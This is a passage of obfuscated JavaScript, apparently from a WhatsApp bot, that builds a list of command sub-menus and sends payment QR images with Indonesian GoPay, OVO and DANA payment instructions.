66,0xdef)+_0x1164f1(0xbdd,0xb45,0x69b,0x75a),_0x3997df[_0x1164f1(0xb25,0xdc3,0x91d,0xddb)]='Sub\x20Menu\x20k'+_0x1164f1(0xc30,0xdd5,0xf58,0xb8e),_0x3997df[_0x257511(0xfb,-0x92,-0x3b,0x374)]=_0x257511(0x2ed,0x3b7,0xa9f,0x6b8)+'u',_0x3997df[_0x257511(0x817,0x79e,0x6e9,0xa7f)]=_0x1164f1(0xf3c,0xe6f,0x135b,0x12fa)+_0x1164f1(0xc53,0xa1d,0xb47,0x594),_0x3997df[_0x257511(0x8aa,0x394,0x7c4,0x3c3)]=_0x1164f1(0x103b,0xd42,0x9b7,0xf85),_0x3997df[_0x257511(0xb4f,0x8ea,0x901,0x99a)]=_0x257511(0x797,0x6a4,0x888,0x8a4),_0x3997df[_0x1164f1(0x70f,0x68c,0x22d,0x9c0)]=_0x1164f1(0x377,0x5aa,0x154,0x7f3)+'is\x20if\x20you\x20'+_0x1164f1(0x7ca,0xbe8,0x997,0xa49)+'e\x20the\x20make'+_0x1164f1(0x4db,0x7d3,0x5a5,0x7e6)+_0x1164f1(0x93f,0xb45,0xb88,0xd52),_0x3997df[_0x257511(0x5b0,0x380,0x48e,0x769)]=_0x257511(0x7f4,0x7c6,0x974,0xb64)+_0x1164f1(0xb4c,0x9fc,0xa05,0xb21),_0x3997df[_0x257511(0x20f,0x596,-0xa8,0x262)]='othermenu',_0x3997df[_0x257511(0xe3,-0x88,-0x6f,0x336)]='_choose\x20th'+_0x257511(0xa0a,0x186,0xaf1,0x645)+_0x1164f1(0xc27,0xbe8,0x91c,0xcbd)+'e\x20the\x20othe'+_0x257511(0x3ab,0x7a1,0x32b,0x4c8)+_0x257511(0x7c9,0x9c4,0x4cf,0x83a),_0x3997df[_0x257511(0x922,0x742,0x950,0x9fc)]=_0x257511(0xee8,0xf2f,0x848,0xb64)+_0x257511(0x7d5,0x736,0x59a,0x80c),_0x3997df['gHkAv']=_0x257511(0x255,0x626,0x170,0x29f)+_0x257511(0x891,0x7d9,0xb39,0x645)+_0x1164f1(0xb20,0xbe8,0x969,0x869)+_0x1164f1(0x111d,0xc61,0xb97,0x1006)+'rmenu\x20comm'+'and_',_0x3997df[_0x1164f1(0xf9e,0xd37,0xb0d,0xf5d)]='storagemen'+'u',_0x3997df[_0x1164f1(0xffa,0xbf8,0xa0f,0x990)]=_0x1164f1(0x9ad,0x5aa,0x9f0,0x30e)+'is\x20if\x20you\x20'+_0x1164f1(0xdb2,0xbe8,0x9a6,0x8cb)+'e\x20the\x20stor'+_0x1164f1(0xe3c,0xa60,0x7cf,0xe66)+_0x1164f1(0x1076,0xc86,0x9a9,0xade);function _0x1164f1(_0x563cb8,_0x30f090,_0x21c8a6,_0xc0191d){return _0x15af3d(_0x30f090-0x213,_0x30f090-0x17a,_0x21c8a6,_0xc0191d-0xc2);}_0x3997df[_0x1164f1(0x54f,0x681,0x89d,0x22f)]=_0x257511(0xc0c,0xc7e,0xf74,0xb64)+_0x1164f1(0x782,0x9bc,0xa32,0x4d5),_0x3997df[_0x1164f1(0x121d,0xdec,0xaca,0xced)]=_0x257511(-0xb6,0x1fb,0x220,0x29f)+_0x257511(0x582,0x4b6,0xaee,0x645)+'want\x20to\x20us'+_0x1164f1(0x897,0xbe7,0xe00,0x10db)+_0x1164f1(0xed5,0xe57,0xe63,0xf54)+'d_',_0x3997df[_0x257511(0x595,0xb6,0xcb,0x3d6)]=_0x1164f1(0xd36,0xe6f,0x11f4,0x1229)+_0x257511(0xb19,0x960,0x89b,0x67a),_0x3997df[_0x257511(0x8e,0x459,0x139,0x3e3)]=_0x257511(0x573,-0xcd,0x581,0x2d2),_0x3997df[_0x257511(0xc9,0x2fd,0x770,0x4f7)]=_0x1164f1(0x39d,0x5aa,0x6e1,0x8ef)+_0x257511(0x20e,0x43d,0x213,0x645)+_0x1164f1(0x1051,0xbe8,0x9b9,0x8a8)+_0x257511(0x6cc,-0x100,0x48c,0x380)+_0x257511(0x480,0x801,0x82,0x317)+'_';function _0x257511(_0x2d90d7,_0x35f41f,_0x3ba994,_0x22ef44){return _0x134458(_0x22ef44-0x5b,_0x35f41f-0x16f,_0x3ba994,_0x22ef44-0x1ea);}_0x3997df['WANMB']=_0x1164f1(0x11da,0xe6f,0xd7c,0x1010)+_0x257511(0x258,0x1f2,0x549,0x3a7),_0x3997df[_0x257511(0xa9f,0xca1,0xbde,0x885)]=_0x1164f1(0xe60,0xcd7,0xa55,0x102f)+'n',_0x3997df[_0x257511(-0xc4,0x310,0x2,0x220)]=_0x1164f1(0x459,0x5aa,0x91e,0x27b)+_0x257511(0x5bf,0x3a3,0x9a9,0x645)+_0x257511(0x52f,0x685,0xbff,0x8dd)+_0x257511(0x8c1,0x9a0,0xa25,0x68d)+'acecan\x20com'+'mand_',_0x3997df[_0x1164f1(0x589,0x677,0x79d,0x74a)]=_0x257511(0x7cb,0xe3a,0x970,0xa95)+_0x1164f1(0x886,0x6e4,0x7d6,0x698),_0x3997df['kBLtQ']='Sub\x20Menu\x20k'+'e-13',_0x3997df[_0x257511(0x99b,0x8dc,0xbae,0xa50)]='nsfw\x20menu',_0x3997df[_0x1164f1(0xb19,0xc1b,0x7fb,0xcfd)]=_0x1164f1(0x5bc,0x5aa,0x5d3,0x95d)+_0x1164f1(0x542,0x950,0x5af,0x7cc)+'want\x20to\x20us'+_0x257511(0x351,0x71e,0x868,0x48e)+_0x257511(0x8c4,0x696,0x89a,0x8fd)+_0x1164f1(0x6ae,0x99d,0x672,0x6ea),_0x3997df['YLpCp']='asupan\x20men'+'u',_0x3997df['muOuZ']=_0x257511(-0x1ab,0x5fc,0x30f,0x29f)+_0x1164f1(0xb09,0x950,0xa30,0x89f)+_0x1164f1(0xaa1,0xbe8,0x948,0xf58)+_0x257511(0x7d7,0x824,0x6ae,0x5d0)+_0x1164f1(0xc64,0xe0f,0xf4a,0x124e)+_0x257511(0xbdd,0xe1b,0x4d3,0x97b),_0x3997df[_0x1164f1(0x695,0xa27,0x942,0xc8e)]=_0x257511(0x955,0x88c,0x7e0,0xb64)+_0x1164f1(0xa5c,0x674,0x9fd,0x6ba),_0x3997df[_0x1164f1(0xd96,0xb05,0xb15,0x910)]='_choose\x20th'+_0x257511(0x2a1,0x1ec,0x547,0x645)+_0x1164f1(0xca5,0xbe8,0xa17,0xd4f)+'e\x20the\x20imag'+_0x1164f1(0x11b7,0xd2f,0xd46,0xa74)+_0x1164f1(0x1243,0xe57,0x10dd,0xa3b)+'d_',_0x3997df[_0x257511(0xa96,0x9f4,0x435,0x6fb)]=_0x1164f1(0xcf3,0xe6f,0xae4,0xeea)+_0x1164f1(0x84f,0x9d7,0xb92,0x842),_0x3997df[_0x1164f1(0x729,0xaa2,0x76f,0x6a5)]=_0x1164f1(0x879,0x500,0x324,0x9ac)+'n',_0x3997df['CFnjM']=_0x1164f1(0x707,0x5aa,0x5a4,0x6cc)+_0x1164f1(0xc63,0x950,0x55d,0x658)+'want\x20to\x20us'+_0x257511(0x8b5,0x6e4,0x5d9,0x68d)+_0x257511(0x97a,0x4b1,0x4fc,0x88e)+_0x257511(0x6ea,0x885,0xcab,0x97b),_0x3997df[_0x257511(0xc8d,0x503,0xbb3,0x95f)]=_0x257511(0x96e,0xb38,0x854,0xb64)+_0x257511(0x2d2,0x31f,0x82d,0x56f),_0x3997df[_0x1164f1(0xab6,0xa4b,0xa2d,0xd76)]='quotesmenu',_0x3997df[_0x1164f1(0x726,0x8b5,0x59f,0x562)]=_0x1164f1(0x100,0x5aa,0x17f,0x1f6)+_0x1164f1(0x8d6,0x950,0xd83,0xa87)+'want\x20to\x20us'+'e\x20the\x20quot'+_0x1164f1(0x811,0x5fe,0x1df,0x587)+'mand_',_0x3997df[_0x257511(0x4e3,0x231,0x501,0x709)]='Sub\x20Menu\x20k'+_0x1164f1(0xc9f,0xa24,0x77e,0x972),_0x3997df[_0x1164f1(0xd3c,0xc5d,0xd30,0x76e)]=_0x1164f1(0x1098,0xde2,0xa66,0x102c),_0x3997df[_0x1164f1(0x6f9,0xb50,0xd16,0xdd5)]='textpromen'+'u',_0x3997df['YMPwd']=_0x1164f1(0xd63,0xe6f,0x12fa,0xbfc)+'e-20',_0x3997df[_0x257511(0x66a,0x8d5,0xcd1,0xa8c)]='_choose\x20th'+_0x1164f1(0x6a8,0x950,0xbdd,0x6e1)+'want\x20to\x20us'+_0x257511(0x3da,0x456,0x276,0x493)+'ooxymenu\x20c'+'ommand_',_0x3997df['kCmgI']=_0x1164f1(0xdf2,0xe6f,0x12a7,0x1197)+_0x257511(0x3d4,0x499,0x214,0x229),_0x3997df['JIHRc']='_choose\x20th'+_0x257511(0x2e5,0x52d,0x2b2,0x645)+_0x1164f1(0x6fc,0xbe8,0xcac,0x8b0)+_0x1164f1(0x372,0x510,0x545,0x3a1)+'dmenu\x20comm'+_0x1164f1(0x6e1,0xb45,0xedc,0xd00),_0x3997df[_0x257511(-0x28,0x498,-0xa9,0x2e8)]=_0x1164f1(0x79f,0x61a,0x251,0x783)+_0x1164f1(0xb5a,0x889,0x4a4,0x42b),_0x3997df[_0x1164f1(0x8d0,0x5ad,0x2d4,0x42e)]=_0x1164f1(0x9e0,0xc2b,0xa3b,0xd93)+'this\x20if\x20yo'+'u\x20want\x20to\x20'+_0x1164f1(0xe19,0x9f9,0x93f,0x648)+_0x1164f1(0xb5d,0xb9d,0xcde,0xf3e)+'s\x20bot_',_0x3997df[_0x257511(0xf10,0x9d1,0xb8c,0xb89)]='source\x20cod'+'e',_0x3997df[_0x1164f1(0xe6b,0xb9b,0x719,0xd37)]=_0x257511(0xac0,0xaad,0xcab,0xa6f)+_0x257511(0x33b,0x836,0x566,0x3dd),_0x3997df[_0x257511(0xcbe,0xce1,0xb4b,0x814)]=_0x257511(0x614,0x1cd,0x8a0,0x531)+_0x257511(0x46a,0xad1,0xb40,0x8e8);const _0x131db4=_0x3997df;let _0x58756a=alpha[_0x1164f1(0xf63,0xe0a,0xb4a,0xa61)+_0x257511(0x79f,0xb62,0xa49,0xb50)+_0x1164f1(0x8e6,0x756,0x2e0,0x3f8)](from,{'listMessage':{'title':_0x1164f1(0x709,0x87f,0xb80,0xab3)+_0x1164f1(0xcbf,0x9fe,0x99a,0x69b),'description':_0x1164f1(0xda9,0xdaf,0x108d,0x11d1)+sender[_0x1164f1(0x7dc,0x752,0x9bc,0x398)]('@')[0x3f6+-0x1eb0+0xb*0x26e]+(_0x1164f1(0xb63,0x69c,0x2fd,0x611)+_0x1164f1(0x695,0x974,0xd64,0xae2)+_0x1164f1(0xbe9,0x721,0x73c,0x654)+'\x20ini\x20adala'+_0x257511(-0x127,0x29,0x71f,0x2b2)+'u\x20bot\x20sila'+_0x1164f1(0x32c,0x71b,0x650,0x54f)+'ih!\x20Don\x27t\x20'+_0x257511(0x2cc,0x5bc,-0x1b4,0x28d)),'buttonText':_0x131db4[_0x1164f1(0x39b,0x4d8,0x358,0x869)],'footerText':'©\x20'+creator,'listType':_0x131db4[_0x257511(0x102e,0x7b7,0xb78,0xb58)],'sections':[{'title':'🐣\x20All\x20menu'+_0x1164f1(0x455,0x6e6,0x4f1,0x39b),'rows':[{'title':_0x131db4[_0x1164f1(0x9a5,0x9c9,0xd53,0x970)],'description':_0x131db4[_0x257511(0x7f8,0x5eb,0x69d,0x577)],'rowId':'0'}]},{'title':_0x131db4[_0x1164f1(0xa84,0x944,0xb65,0x900)],'rows':[{'title':_0x131db4['EtjtE'],'description':_0x131db4[_0x1164f1(0x766,0x83f,0xae5,0xa14)],'rowId':'0'}]},{'title':_0x131db4[_0x1164f1(0xce4,0xb7d,0xa29,0xf38)],'rows':[{'title':_0x131db4[_0x1164f1(0x937,0xcb8,0xe3f,0x1128)],'description':_0x131db4[_0x1164f1(0xaff,0x61e,0x737,0x8b5)],'rowId':'0'}]},{'title':_0x131db4['YAZdn'],'rows':[{'title':_0x131db4[_0x257511(0x47,0x5a9,0x73f,0x374)],'description':_0x257511(0x201,0x5fa,0x45d,0x29f)+'is\x20if\x20you\x20'+'want\x20to\x20us'+_0x1164f1(0xdf5,0xb4f,0xcd0,0xfe9)+'ertmenu\x20co'+'mmand_','rowId':'0'}]},{'title':_0x131db4['JyVeg'],'rows':[{'title':_0x131db4[_0x257511(0x149,0x1e3,0x76a,0x3c3)],'description':_0x257511(0x5c3,0x2a7,0x760,0x29f)+'is\x20if\x20you\x20'+_0x1164f1(0xa43,0xbe8,0xda8,0xa7c)+_0x257511(0x1ef,0x68a,-0x154,0x20c)+_0x1164f1(0x1315,0xe57,0xbbd,0x11db)+'d_','rowId':'0'}]},{'title':'Sub\x20Menu\x20k'+_0x257511(0x606,0xd64,0x3d4,0x875),'rows':[{'title':_0x131db4[_0x1164f1(0xe9d,0xca5,0x1084,0x1180)],'description':_0x131db4[_0x257511(0x7e0,0x67f,-0x111,0x381)],'rowId':'0'}]},{'title':_0x131db4[_0x257511(0x483,0x8dc,0x5c8,0x769)],'rows':[{'title':_0x131db4[_0x1164f1(0x95e,0x56d,0x95e,0x7db)],'description':_0x131db4[_0x257511(-0xd3,0x5fd,0x4c4,0x336)],'rowId':'0'}]},{'title':_0x131db4[_0x257511(0x67c,0xea8,0xdcc,0x9fc)],'rows':[{'title':_0x257511(0x49a,0x531,0x5f,0x38f),'description':_0x131db4[_0x1164f1(0x8d4,0x64b,0x2fe,0x81e)],'rowId':'0'}]},{'title':_0x1164f1(0x1111,0xe6f,0xd19,0x1332)+_0x257511(0xd3d,0x964,0xa4a,0xb03),'rows':[{'title':_0x131db4[_0x257511(0x741,0xd3d,0x9ee,0xa2c)],'description':_0x131db4[_0x1164f1(0x1011,0xbf8,0xec0,0x7bc)],'rowId':'0'}]},{'title':_0x131db4[_0x257511(-0x95,0x131,0x4d2,0x376)],'rows':[{'title':'tagmenu','description':_0x131db4['LJllf'],'rowId':'0'}]},{'title':_0x131db4[_0x257511(0x6a9,0x13f,0x113,0x3d6)],'rows':[{'title':_0x131db4[_0x1164f1(0x351,0x6ee,0x6bb,0x881)],'description':_0x131db4[_0x1164f1(0x3a8,0x802,0x958,0x431)],'rowId':'0'}]},{'title':_0x131db4[_0x1164f1(0x61b,0x6dd,0xb5c,0x6c0)],'rows':[{'title':_0x131db4['VbDpw'],'description':_0x131db4['YBlvE'],'rowId':'0'}]},{'title':'Sub\x20Menu\x20k'+_0x1164f1(0xf92,0xd6c,0x9e3,0xcc2),'rows':[{'title':_0x131db4['jGbdF'],'description':'_choose\x20th'+_0x1164f1(0x5cf,0x950,0xd77,0x948)+_0x257511(0xa11,0x63d,0x5b8,0x8dd)+'e\x20the\x20tele'+_0x257511(0xb64,0x46e,0x62f,0x8e7)+'d_','rowId':'0'}]},{'title':_0x131db4[_0x1164f1(0x960,0xdac,0xa50,0x9fa)],'rows':[{'title':_0x131db4[_0x1164f1(0xfcc,0xd5b,0x1249,0x1099)],'description':_0x131db4['qAggl'],'rowId':'0'}]},{'title':_0x257511(0xde9,0x6d6,0x8a2,0xb64)+'e-14','rows':[{'title':_0x131db4['YLpCp'],'description':_0x131db4['muOuZ'],'rowId':'0'}]},{'title':_0x131db4[_0x1164f1(0xf0b,0xa27,0xc91,0x8b1)],'rows':[{'title':_0x1164f1(0x1147,0xe4c,0x1160,0xbd4)+'ct','description':_0x131db4[_0x257511(0xa10,0x9bd,0xa3a,0x7fa)],'rowId':'0'}]},{'title':_0x131db4[_0x257511(0x66c,0x508,0x3dc,0x6fb)],'rows':[{'title':_0x131db4['TALUl'],'description':_0x131db4['CFnjM'],'rowId':'0'}]},{'title':_0x131db4[_0x257511(0xe2a,0xb46,0x893,0x95f)],'rows':[{'title':_0x131db4['yuvrd'],'description':_0x131db4['tphym'],'rowId':'0'}]},{'title':_0x131db4[_0x257511(0x468,0x6a7,0x6ac,0x709)],'rows':[{'title':_0x131db4['MRdXe'],'description':'_choose\x20th'+_0x1164f1(0x8bf,0x950,0xc0b,0x86b)+_0x1164f1(0xd95,0xbe8,0xd51,0xc80)+'e\x20the\x20anim'+'emenu\x20comm'+_0x257511(0x991,0xa1d,0x7d1,0x83a),'rowId':'0'}]},{'title':_0x1164f1(0xfa4,0xe6f,0xf59,0xe76)+_0x257511(0x1020,0xc47,0xbf2,0xb32),'rows':[{'title':_0x131db4['icyjd'],'description':_0x257511(0x76a,0x77e,0x381,0x29f)+'is\x20if\x20you\x20'+'want\x20to\x20us'+_0x1164f1(0xfec,0xbd9,0x105b,0x1044)+_0x1164f1(0x6d5,0x964,0x78e,0xada)+'mmand_','rowId':'0'}]},{'title':_0x131db4['YMPwd'],'rows':[{'title':_0x1164f1(0xa37,0xe8e,0x120e,0x1130)+'nu','description':_0x131db4[_0x257511(0x767,0xb49,0xd53,0xa8c)],'rowId':'0'}]},{'title':_0x131db4[_0x1164f1(0x4b8,0x984,0x6dc,0xb34)],'rows':[{'title':_0x1164f1(0x886,0x865,0x6ce,0x600),'description':_0x131db4[_0x1164f1(0x538,0x62e,0x414,0xa6c)],'rowId':'0'}]},{'title':_0x131db4['uidGD'],'rows':[{'title':_0x257511(0xc81,0x54f,0x59d,0x9f6)+'e','description':_0x131db4[_0x257511(0x1ac,0x314,-0x11f,0x2a2)],'rowId':_0x131db4[_0x1164f1(0xd7e,0xe94,0xc6b,0xc0b)]}]},{'title':_0x131db4[_0x1164f1(0xa96,0xb9b,0xd9c,0x1036)],'rows':[{'title':_0x131db4[_0x1164f1(0xea3,0xb1f,0x7e5,0x868)],'description':_0x257511(0x561,0x6a3,0xddb,0x920)+_0x257511(0xf4,-0x1d6,0x4e0,0x2a7)+'u\x20want\x20to\x20'+_0x257511(0xbbe,0xc2d,0xdb7,0x8f0)+_0x257511(0x407,0x9e9,0x94c,0x878)+_0x1164f1(0xa47,0x6f5,0x33e,0x74c)+'\x20this\x20scri'+_0x1164f1(0xe97,0xd57,0x98c,0x11a7),'rowId':'0'}]}]}},{'quoted':fgclink2,'contextInfo':{'mentionedJid':[sender]}});const _0x4b0bb8={};_0x4b0bb8[_0x1164f1(0xd47,0x8d7,0x8d0,0xcee)]=!![],alpha['relayWAMes'+_0x257511(0x8ea,0x577,0xd4f,0x9fe)](_0x58756a,_0x4b0bb8);},sendImageMaker=async(_0x426e23,_0x50ecda,_0x4fffbc)=>{const _0x5a485a={'JuHOe':function(_0x8f3396,_0x11abc8){return _0x8f3396(_0x11abc8);},'fcVWk':function(_0x5ca895,_0x56fad8){return _0x5ca895!==_0x56fad8;},'SsWsg':_0x702f2c(0xc15,0xb71,0x981,0xd5d),'AWZsF':_0x702f2c(0xa45,0x9aa,0xb87,0xa62)+_0x702f2c(0xb3f,0xb51,0xcb7,0xf95)+_0x494043(0xbda,0x9c5,0x554,0x4e3)+_0x494043(0x78c,0x7d7,0xb87,0x9dd)+'gi','QtDBv':_0x702f2c(0x78a,0x842,0x9ad,0xb11)+_0x494043(0x758,0x980,0x9cb,0x5a5),'cpsrp':_0x702f2c(0x8f3,0x8a,0x475,0x65d),'dUWdK':'🐨\x20Owner','bsOWK':_0x494043(0x3ea,0x400,0x606,-0xbf),'wVHVG':_0x494043(0xfe3,0xbbe,0xf2f,0xecf)},_0x18e6c8=await alpha['prepareMes'+_0x494043(0x83a,0xad8,0xcee,0xeed)](from,_0x426e23,MessageType[_0x494043(0x4f2,0x4af,0x8e1,0x192)],{'thumbnail':Buffer[_0x702f2c(0x2fd,0x3b8,0x62f,0x65c)](-0xb18+0x1a6a+-0xf52*0x1)});let _0xfeb4c8=_0x18e6c8['message'][_0x5a485a[_0x494043(0x89b,0x436,0x38f,-0x9d)]]?_0x18e6c8[_0x702f2c(0xb02,0xce0,0x82e,0xab9)]['ephemeralM'+_0x494043(0xa76,0x980,0xe27,0x6dc)]:_0x18e6c8;const _0x562d14={};_0x562d14[_0x494043(0xd12,0xc15,0x1042,0xff5)]=_0x5a485a[_0x494043(0x8e9,0x8f3,0xc3f,0x518)],_0x562d14[_0x494043(0x20d,0x589,0xa32,0xa4e)]={},_0x562d14[_0x702f2c(0x8bb,0xdbd,0xab4,0xcc8)]=0x1,_0x562d14[_0x494043(0x20d,0x589,0xa32,0xa4e)][_0x494043(0x9bc,0x6ce,0xac0,0x488)+'t']=_0x5a485a[_0x702f2c(0x57e,0x9e8,0x9ab,0x839)];const _0x3af78e={};_0x3af78e[_0x702f2c(0xa75,0x9f6,0xc95,0x8e4)]=_0x5a485a[_0x702f2c(0x10d0,0x825,0xc7c,0xbcc)];function _0x702f2c(_0x6153bd,_0x433fdb,_0x4288b2,_0x14fe12){return _0x134458(_0x4288b2-0x1b5,_0x433fdb-0xbe,_0x6153bd,_0x14fe12-0x198);}_0x3af78e[_0x494043(0x7a2,0x589,0x318,0x32c)]={},_0x3af78e[_0x494043(0xc20,0xa34,0xbe1,0xec5)]=0x1,_0x3af78e[_0x494043(0x7a2,0x589,0x318,0x32c)][_0x702f2c(0x77e,0x3fc,0x74e,0xbba)+'t']=_0x5a485a[_0x702f2c(0x10c5,0x105a,0xc0f,0xf14)];const _0x1f70da=[_0x562d14,_0x3af78e];function _0x494043(_0x10174c,_0x1f52c6,_0xe9f772,_0x43377c){return _0x15af3d(_0x1f52c6- -0x1e,_0x1f52c6-0x100,_0xe9f772,_0x43377c-0x2b);}const _0x574cd8={'contentText':_0x50ecda,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x702f2c(0x5d3,0x301,0x72b,0x461)+_0x702f2c(0xa17,0x1d7,0x5bf,0x84f))+_0x4fffbc[_0x494043(0x33a,0x521,0x4f3,0x870)]('@')[0x6b*0x3+-0x1*0x2006+0x1ec5],'buttons':_0x1f70da,'headerType':0x4,'imageMessage':_0xfeb4c8['message'][_0x702f2c(0x864,0x9bb,0x987,0x90f)+'ge']},_0x32bfea={};_0x32bfea[_0x494043(0x966,0x538,0x1f3,0x12e)+'id']=[_0x4fffbc];const _0x59f6d6={};_0x59f6d6['quoted']=mek,_0x59f6d6['contextInf'+'o']=_0x32bfea,alpha[_0x702f2c(0xac5,0xa5d,0xb37,0xa36)+'e'](from,_0x574cd8,MessageType['buttonsMes'+'sage'],_0x59f6d6)[_0x702f2c(0x414,0x812,0x8b4,0x646)](_0x204566=>{function _0x34a441(_0x497510,_0x4892e3,_0x44ae1a,_0x1ccaef){return _0x494043(_0x497510-0x1d7,_0x497510-0xf2,_0x1ccaef,_0x1ccaef-0x11a);}function _0x2d8b73(_0x2c17ea,_0x713060,_0x386a6c,_0x207930){return _0x494043(_0x2c17ea-0x53,_0x207930- -0x411,_0x2c17ea,_0x207930-0x1);}const _0x255f60={'dtpjA':function(_0x5141c2,_0x10d913){function _0x47f556(_0x2d0d89,_0x264309,_0x30d58b,_0x596b21){return _0x4ca6(_0x596b21-0x1bf,_0x30d58b);}return _0x5a485a[_0x47f556(0xad6,0x591,0x7d7,0x986)](_0x5141c2,_0x10d913);}};_0x5a485a[_0x2d8b73(-0x17c,-0x1a7,0x3c,-0x9f)](_0x5a485a[_0x34a441(0x513,0x227,0xfc,0x6a7)],_0x5a485a[_0x2d8b73(-0x3f8,-0x8b,0x96,0x10)])?_0x255f60['dtpjA'](_0x523ca5,_0x34a441(0x3e2,0x756,-0x4f,0x4df)):_0x5a485a[_0x34a441(0x9d7,0xa33,0xd13,0x8d1)](reply,_0x5a485a[_0x2d8b73(-0x1fb,0xf5,0x4fa,0x19d)]);});},send_qr_gopay=async(_0x27dfd2,_0x359de5)=>{ini_bayar=ucapannya2+(_0x12a979(0xb2d,0x8b8,0xb89,0x826)+_0x12a979(0x98e,0x56e,0x5ed,0x111))+pushname+('_\x0a•>\x20Nomor'+_0x12a979(0x254,0x340,0x260,0x4cc))+sender[_0x3f6a42(0x517,0x5d4,0x4b6,0x767)]('@')[0x12f8+-0x1d25+-0xa2d*-0x1]+(_0x12a979(0x840,0x39d,0x2ac,0x4a8)+'\x20:\x0a1.\x20Buka'+'\x20Aplikasi\x20'+_0x3f6a42(0x794,0xab8,0x8a5,0xc9a)+_0x12a979(0x8b2,0x4c7,0xe9,0x6a)+'Pilih\x20Pay\x20'+_0x3f6a42(0xfa7,0xd08,0xfcf,0xb27)+'\x20Scan\x20Barc'+_0x12a979(0x3ce,0x457,0x8e3,0x384)+_0x3f6a42(0x764,0x917,0x870,0xdf6)+_0x3f6a42(0x313,0x351,-0x5d,0x2f7)+_0x3f6a42(0xaac,0x89c,0x42f,0x65e)+'l\x20pembayar'+'an\x0a5.\x20Sele'+_0x3f6a42(0x8d7,0x441,-0x6a,0x85d)+_0x12a979(0x469,0x351,0x39d,0x1c6))+ini_mark['split']('@')[-0xa5*-0x3+-0x12ad+-0x1*-0x10be]+'_\x0a';const _0x198891={};function _0x12a979(_0x45a507,_0x196263,_0x4bd5e2,_0x2fb316){return _0x15af3d(_0x196263- -0xf5,_0x196263-0xe8,_0x4bd5e2,_0x2fb316-0x138);}function _0x3f6a42(_0x27d2f7,_0x5e621c,_0x5121cf,_0x58f338){return _0x134458(_0x5e621c-0x1e8,_0x5e621c-0x5a,_0x58f338,_0x58f338-0xc6);}_0x198891['mentionedJ'+'id']=[sender,ini_mark],await alpha[_0x12a979(0x59e,0x9e0,0xa92,0xb49)+'e'](from,_0x27dfd2,image,{'thumbnail':Buffer[_0x12a979(0x99a,0x4d8,0x307,0x835)](0x1*-0xf4f+-0x16c5+0x2614),'quoted':_0x359de5,'caption':ini_bayar,'contextInfo':_0x198891});},send_qr_ovo=async(_0x306129,_0x3d741a)=>{function _0x2161bd(_0x3c32e1,_0x1d02f4,_0x2e3483,_0x41fc66){return _0x134458(_0x2e3483-0x270,_0x1d02f4-0x5b,_0x1d02f4,_0x41fc66-0xb7);}ini_bayar=ucapannya2+(_0x2b32f3(0x5d0,0x6f0,0x200,0x6cc)+'\x20:\x20_')+pushname+(_0x2161bd(0xf2c,0xe61,0xb38,0x8c5)+_0x2b32f3(0x58,-0x2e,0x363,-0xb2))+sender[_0x2b32f3(0x162,-0x260,-0x35b,-0x54)]('@')[-0x4*-0x3fd+0xbc5*0x1+-0x1bb9]+(_0x2b32f3(0x228,0x447,0x1f7,0x189)+_0x2161bd(0xfb3,0xc1b,0xd36,0x9d2)+_0x2b32f3(0x145,0x147,0x4c,-0x166)+_0x2161bd(0x718,0x412,0x4a7,0x67c)+_0x2161bd(0x918,0x9c8,0x564,0x76d)+_0x2b32f3(0x536,0x87,0x9f1,0x327)+_0x2b32f3(-0x8,0x2a5,-0x213,0x8)+'Scan\x20Barco'+_0x2161bd(0x64a,0x4e7,0x48d,0x4c9)+_0x2161bd(0x87b,0x7e0,0x857,0xcf9)+_0x2161bd(0xeae,0x1080,0xc7a,0xf87)+_0x2161bd(0x613,0x55f,0xa34,0xdcf)+_0x2161bd(0x891,0x10b6,0xbda,0x703)+_0x2161bd(0xb9f,0x78c,0x8dc,0x89f)+_0x2b32f3(-0x45,0x274,-0x39a,-0x20e)+'@')+ini_mark['split']('@')[0x824*-0x3+0x24a1*-0x1+0x1*0x3d0d]+'_\x0a';const _0x57405={};_0x57405[_0x2161bd(0x6ff,0x988,0x673,0x68f)+'id']=[sender,ini_mark];function _0x2b32f3(_0x3543b8,_0x2cd1a3,_0x53ad8d,_0x3a54be){return _0x15af3d(_0x3543b8- -0x3dd,_0x2cd1a3-0xf1,_0x53ad8d,_0x3a54be-0x1b5);}await alpha[_0x2b32f3(0x6f8,0x55e,0xad7,0x441)+'e'](from,_0x306129,image,{'thumbnail':Buffer[_0x2161bd(0x581,0x96f,0x6ea,0xb9b)](0x1d8f+-0x1214+-0xb7b),'quoted':_0x3d741a,'caption':ini_bayar,'contextInfo':_0x57405});},send_qr_dana=async(_0x277ffc,_0x4afcd2)=>{ini_bayar=ucapannya2+(_0x249944(0x656,0x79d,0x439,0x70e)+_0x589445(-0x71,0x75d,0x472,0x8d4))+pushname+(_0x249944(0x4bc,0x80b,0xafe,0x5cd)+_0x249944(0x191,0x225,0x476,-0x2d0))+sender['split']('@')[0x21b7+-0x12a7+-0xf10]+(_0x249944(-0xd1,0x282,0x546,-0x4f)+_0x249944(0x77a,0x293,-0x135,0x1be)+_0x589445(0x1ac,0x647,0x4f0,0x42c)+_0x589445(0xaa5,0xa1c,0x743,0xb66)+_0x589445(0x2ec,0x71d,0x256,0x19a)+_0x589445(0x501,0x3fb,0x722,0x620)+'\x20Bayar\x0a3.\x20'+_0x589445(0x8e6,0x69b,0x5f6,0x2ba)+'de\x20diatas\x20'+_0x589445(-0x229,-0x2dd,0xd2,-0x26e)+_0x589445(0x99d,0x693,0x4dd,0x86a)+'n\x20Nominal\x20'+_0x589445(0x53f,0xac9,0x659,0xa3b)+_0x249944(0x919,0x854,0x5ec,0x497)+_0x589445(0x299,0x1c0,0x380,0x294)+'\x20@')+ini_mark[_0x589445(0x559,0x202,0x34e,0x46c)]('@')[0x5*-0x31f+0x2251+-0x12b6]+'_\x0a';const _0x1d4f8={};_0x1d4f8['mentionedJ'+'id']=[sender,ini_mark];function _0x589445(_0x5abb0a,_0x1279be,_0x3a7480,_0x4fab28){return _0x134458(_0x3a7480- -0x9e,_0x1279be-0x17e,_0x1279be,_0x4fab28-0x132);}function _0x249944(_0x4b7214,_0x2d520c,_0x5f16df,_0x417f25){return _0x15af3d(_0x2d520c- -0x210,_0x2d520c-0x182,_0x5f16df,_0x417f25-0xc1);}await 